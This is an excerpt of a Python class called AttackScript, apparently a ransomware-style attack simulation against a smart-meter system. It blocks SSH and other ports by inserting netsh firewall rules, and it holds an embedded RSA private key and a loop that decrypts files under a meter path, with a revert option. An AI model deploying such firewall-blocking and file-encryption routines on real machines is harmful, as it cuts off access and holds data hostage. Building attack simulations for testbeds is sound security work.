...
class AttackScript:
    ...
    def disable_ssh(self) -> None:
        ...
        for rule in firewall_rules:
            cp = run(f'netsh advfirewall firewall add rule name="{rule["name"]}"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print(f"{rule['type']} Firewall Successfully Inserted (Blocked: {rule['protocol']}/{rule['port']})")
            else:
                print(f"{rule['type']} Firewall Failed to be Inserted ({rule['protocol']}/{rule['port']})")
    ...
    def revert(self, revert_option):
        ...
        if revert_option == "1":
            ...
            count = 0
            for rule in firewall_rules:
                cp = run(f'netsh advfirewall firewall delete rule name="{rule["name"]}"', stdout=PIPE)
                if "Ok." in cp.stdout.decode('utf-8'):
                    count += 1
                    print(
                        f"{rule['type']} Firewall Successfully Removed (Un-Blocked: {rule['protocol']}/{rule['port']})")
                else:
                    print(f"{rule['type']} Firewall Not Removed ({rule['protocol']}/{rule['port']})")
    ...
    -----END RSA PRIVATE KEY-----'''
            ...
            try:
                for item in self.recurseFiles(self.SMARTMETER_PATH):
                    ...
                    if fileType in excludeExtension:
                        continue
                    self.decrypt(file_path, privatekey)
